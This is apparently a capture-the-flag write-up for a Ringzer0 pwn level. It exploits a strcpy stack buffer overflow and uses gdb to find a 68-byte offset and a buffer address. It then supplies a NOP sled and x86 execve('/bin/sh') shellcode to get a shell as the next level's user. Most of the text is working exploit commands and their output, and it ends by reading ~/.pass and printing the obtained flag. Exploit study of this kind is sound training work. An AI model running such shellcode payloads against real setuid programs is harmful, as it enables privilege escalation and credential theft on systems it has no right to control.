# Level 3 Ringzer0 Pwn challenges
From the source code we see that we are running a vulnerable strcpy function in the concat function

We can't send more than 128 bytes in the second parameter but we overflow the buffer because we are sending multiple inputs

after trial and error, we are getting the offset to be:
68

```text
(gdb) r $(python -c 'print "A"*68 + "CCCC"') $(python -c 'print "B"*128')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level3 $(python -c 'print "A"*68 + "CCCC"') $(python -c 'print "B"*128')
String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

Now we can try to find the pointer where we can find shellcode
```text
level3@lxc-pwn-x86:/levels$ gdb -q level3
Reading symbols from level3...done.
(gdb) b 15
Breakpoint 1 at 0x80484e9: file level3.c, line 15.
(gdb) r $(python -c 'print "A"*68 + "CCCC"') $(python -c 'print "B"*128')
Starting program: /levels/level3 $(python -c 'print "A"*68 + "CCCC"') $(python -c 'print "B"*128')

Breakpoint 1, concat (buf=0xffffdab0 'B' <repeats 128 times>, 'A' <repeats 68 times>, "CCCC"..., s1=0xffffd9b0 'B' <repeats 128 times>, 'A' <repeats 68 times>, "CCCC", s2=0xffffda30 'A' <repeats 68 times>, "CCCC") at level3.c:15
15      }
(gdb) print &buf
$1 = (char **) 0xffffd9a0
(gdb) x/wx 0xffffd9a0
0xffffd9a0:     0xffffdab0
(gdb) x/wx 0xffffdab0
0xffffdab0:     0x42424242
```

So now we know that the pointer to shellcode could be at 0xffffdab0

Let's try and get shell in gdb

```text
(gdb) r $(python -c 'print "A"*68 + "\xb0\xda\xff\xff"') $(python -c 'print "\x90"*104 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level3 $(python -c 'print "A"*68 + "\xb0\xda\xff\xff"') $(python -c 'print "\x90"*104 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
String result: ��������������������������������������������������������������������������������������������������������1�Phn/shh//bi���RS���
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
process 29980 is executing new program: /bin/sh
process 29980 is executing new program: /bin/bash
level3@lxc-pwn-x86:/levels$
```
Now that we have shell with GDB, we need to get shell outside.

We learnt from challenge 1 that if we change the address by 16, it works outside

```text
level3@lxc-pwn-x86:/levels$ ./level3 $(python -c 'print "A"*68 + "\xc0\xda\xff\xff"') $(python -c 'print "\x90"*104 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
String result: ��������������������������������������������������������������������������������������������������������1�Phn/shh//bi���RS���   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
level4@lxc-pwn-x86:/levels$ cat ~/.pass
VHDY2pdYVyXi08kupbos
level4@lxc-pwn-x86:/levels$ exit
exit
```

We have shell!
The flag for the next level is 

```text
VHDY2pdYVyXi08kupbos
```


